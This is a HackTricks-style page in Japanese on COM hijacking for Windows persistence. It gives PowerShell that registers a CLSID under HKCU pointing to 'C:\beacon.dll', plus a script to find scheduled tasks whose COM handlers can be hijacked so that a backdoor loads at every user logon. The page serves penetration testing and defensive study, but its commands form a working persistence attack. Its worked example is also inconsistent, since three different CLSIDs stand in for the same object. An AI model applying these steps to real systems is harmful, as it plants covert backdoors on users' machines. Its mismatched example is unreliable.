# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しないCOMコンポーネントの検索

HKCUの値はユーザーによって変更可能であるため、**COM Hijacking**は**永続的なメカニズム**として使用される可能性があります。`procmon`を使用すると、攻撃者が永続化のために作成できる存在しないCOMレジストリを簡単に見つけることができます。フィルター：

- **RegOpenKey**操作。
- _Result_が**NAME NOT FOUND**であること。
- そして、_Path_が**InprocServer32**で終わること。

どの存在しないCOMを偽装するか決定したら、次のコマンドを実行します。_数秒ごとに読み込まれるCOMを偽装することを決定した場合は、過剰になる可能性があるため注意してください。_
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasksはカスタムトリガーを使用してCOMオブジェクトを呼び出し、タスクスケジューラを通じて実行されるため、いつトリガーされるかを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すると、例えば**ユーザーがログインするたびに実行される**ものを選択できます。

次に、**HKEY\CLASSES\ROOT\CLSID**およびHKLMとHKCUでCLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**を検索すると、通常、HKCUにはその値が存在しないことがわかります。
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
その後、HKCUエントリを作成するだけで、ユーザーがログインするたびにバックドアが起動します。

{{#include ../../banners/hacktricks-training.md}}
